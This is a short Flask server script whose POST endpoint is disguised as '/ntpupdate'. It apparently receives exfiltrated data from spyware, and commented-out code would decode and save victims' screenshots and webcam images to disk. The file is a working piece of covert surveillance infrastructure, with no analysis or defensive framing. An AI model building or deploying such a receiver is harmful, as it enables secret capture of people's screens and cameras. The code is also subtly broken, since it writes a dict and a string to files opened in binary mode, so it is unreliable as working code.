from flask import Flask, request
import base64
import datetime
app = Flask(__name__)

def save(encoded_data, filename):
    try:
        decoded_data = base64.b64decode(encoded_data)
        # print(decoded_data)
        with open(filename, 'wb') as file:
            file.write(decoded_data)
        print(f"Saved {filename}")
    except Exception as e:
        with open("Errorlogs.log", 'wb') as file:
            file.write(f"Error saving {filename}: {str(e)}")
        print(f"Error saving {filename}: {str(e)}")

@app.route('/ntpupdate', methods=['POST'])
def bingo():
    try:
        data = request.json
        print(data)
        with open(datetime.datetime.now().strftime("%Y%m%d%H%M%S"), 'wb') as file:
            file.write(data)
        # if 'screenshot' in data:
        #     save(data['screenshot'], 'received_screenshot.png')

        # if 'webcam_image' in data:
        #     save(data['webcam_image'], 'received_webcam_image.jpg')

        return " ", 200
    except Exception as e:
        return str(e), 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
